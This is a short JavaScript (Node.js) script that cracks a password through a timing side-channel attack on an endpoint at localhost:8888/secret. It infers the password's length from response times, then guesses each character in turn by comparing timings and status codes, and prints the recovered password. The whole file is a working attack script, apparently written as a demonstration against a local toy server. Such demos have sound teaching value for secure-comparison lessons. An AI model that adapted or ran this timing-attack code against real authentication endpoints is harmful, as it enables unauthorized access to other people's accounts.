var request = require('request')

function nextChar(c) {
    if (c == 'z') {
        return 'A'
    }
    return String.fromCharCode(c.charCodeAt(0) + 1);
}
nextChar('a');

function getParams(password) {
    return {
        uri: 'http://localhost:8888/secret',
        method: 'POST',
        json: {
            "password": password
        }
    }
}

function timedRequest(params, callback) {
    var tick = new Date()
    request(params, function(err, res, body) {
        res.time = new Date() - tick
        callback(err, res, body)
    })
}

function tryLength(password, time, callback) {
    timedRequest(getParams(password), function(err, res, body) {
        if (res.time > time) {
            return callback(password, res.time)
        }
        tryLength(password + 'a', res.time, callback)
    })
}

function nextPassword(password, pos) {
    var letter = password[pos] == 'z' ? 'A' : String.fromCharCode(password.charCodeAt(pos) + 1)
    return password.substr(0, pos) + letter + password.substr(pos + 1)
}

function tryPassword(password, pos, last, time, callback) {
    timedRequest(getParams(password), function(err, res, body) {
        if (res.statusCode !== 500 || res.time > last + time) {
            console.log("The letter number " + (pos + 1) + " is " + password[pos])
            if (pos + 1 == password.length) {
                return callback(password)
            }
            return tryPassword(password, pos + 1, res.time, time, callback)
        }
        if (password[pos] == 'Z') {
            return callback(null, "I couldn't crack the letter number " + (pos + 1) + " of the password :(")
        }
        tryPassword(nextPassword(password, pos), pos, res.time, time, callback)
    })
}

tryLength('', 50, function(password, last) {
    console.log("I've found the length of the password! It's " + password.length + " characters long.")
    tryPassword(password, 0, last, 50, function(password, error) {
        if (error) {
            return console.log(error)
        }
        console.log("Hurray! The password is " + password)
    })
})
